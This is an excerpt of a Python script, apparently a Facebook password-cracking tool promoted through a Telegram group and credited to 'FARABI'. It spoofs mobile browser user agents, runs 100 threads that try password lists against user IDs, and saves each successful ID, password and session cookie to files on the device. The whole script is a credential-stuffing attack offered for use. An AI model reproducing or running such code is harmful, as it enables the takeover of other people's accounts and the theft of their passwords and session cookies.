...
for ua in range(5000):
    ...
    ugen.append(uaku2)
os.system('xdg-open t.me/mueorb')
logo=("""
---------------------------------------------------
_   _   _   _   _   _     _   _   _  
  / \ / \ / \ / \ / \ / \   / \ / \ / \ 
...
TYPE TYPE : FREE 
VERSION   : 1.
IF YOU NEED THIS SCRIPT JOIN TELEGRAM
---------------------------------------------------
""")
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
...
def mueor():
    ...
    with ThreadPool(max_workers=100) as MUEOR:
        ...
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOOL CREATED BY FARABI JOIN MY GROUP ')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sFARABI\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            'dpr': '2.8812501430511475',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"M2003J15SC"',
           ...
           'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m[FARABI-OK💚] {uid} • {ps}" '  \n\033[1;33m [💉]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [🤧] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/FARABI-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[FARABI-CP💔] {uid} • {ps}")
                open('/sdcard/FARABI-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
